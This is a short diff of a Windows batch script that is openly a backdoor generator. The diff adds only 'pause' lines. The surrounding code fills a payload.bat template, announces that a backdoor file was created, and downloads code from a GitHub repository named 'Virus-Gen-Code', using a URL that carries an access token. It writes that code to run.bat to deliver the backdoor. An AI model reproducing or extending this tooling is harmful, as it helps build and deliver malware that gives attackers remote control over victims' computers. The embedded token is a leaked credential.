@@ -70,13 +70,20 @@ If exist "%File%" (
 )
 powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtxt', '%opt1%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
 if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor file![0m) else (goto error6)
+pause
 timeout 1 /NOBREAK >nul
+pause
 :: generate a file to move files to their proper location
 echo [33mdownloading code to deliver backdoor...[0m
+pause
 set dlerror=7
+pause
 Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC?token=ANX5WBHRRO5XGZLFD4PQSVLAKLC2Q"
+pause
 for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
+pause
 Call :Download "%url%" "%File%"
+pause
 If exist "%File%" ( 
     ( Type "%File%")>con
 ( Type "%File%" >%opt2%\run.bat)
